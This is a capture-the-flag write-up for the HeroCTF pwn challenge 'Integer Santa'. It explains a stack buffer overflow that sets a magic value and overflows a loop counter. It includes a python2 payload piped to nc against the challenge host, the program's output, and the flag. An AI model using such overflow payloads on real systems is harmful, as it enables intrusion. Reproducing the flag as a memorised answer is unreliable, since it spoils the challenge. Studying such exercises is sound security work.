# Integer Santa

### Category

Pwn

### Description

Tell Santa what you want for chrismas ! 

```
Host : chall0.heroctf.fr
Port : 9000
```

Format : **Hero{flag}**<br>
Author : **SoEasY**

### Write up

This loop is interesting : 

```c
for(int i=0; i < tours; i++){
    if(i > strlen(flag))
        break;
    printf("%.*s\n", strlen(input) == 0 && valeur==0xcafebabe, ptr);
		ptr += 1;
}
```

We have to overflow the input buffer of 64 bytes, keep the value 0xcafebabe for the int "valeur" (cf. source code in C) and then overflow the "tours" int, whith  the length of the input which must be 0.

Then, the condition `strlen(input) == 0 && valeur==0xcafebabe` will return TRUE, which correponds to the int 1, and so the programm will give you a letter of the flag. By overflowing the variable "tours" we can print all the flag.

So the payload contains : 
- \x00 * 64 to overflow the buffer and having a input length of 0
- 0xcafebabe 
- a caracter to overflow the "tours" int

```bash
$ python2 -c "print('\x00'*64 + '\xbe\xba\xfe\xca' + '1')" | nc challs.heroctf.fr xxxx
██╗  ██╗███████╗██████╗  ██████╗  ██████╗████████╗███████╗
██║  ██║██╔════╝██╔══██╗██╔═══██╗██╔════╝╚══██╔══╝██╔════╝
███████║█████╗  ██████╔╝██║   ██║██║        ██║   █████╗  
██╔══██║██╔══╝  ██╔══██╗██║   ██║██║        ██║   ██╔══╝  
██║  ██║███████╗██║  ██║╚██████╔╝╚██████╗   ██║   ██║     
╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝ ╚═════╝  ╚═════╝   ╚═╝   ╚═╝     
================ Integer Santa (by SoEasY) ===============

Ho ho ho... It's Integer Santa !
Tell me what do you wan for Xmas kiddo (you can ask for 1 gift only !!!) : H
e
r
o
{
W
3
1
r
d
_
0
v
3
r
F
l
0
w
_
f
0
r
_
X
m
4
s
}

Alright ! I'll tell my pixies :)
See u kiddo !
```

### Flag

Hero{W31rd_0v3rFl0w_f0r_Xm4s}
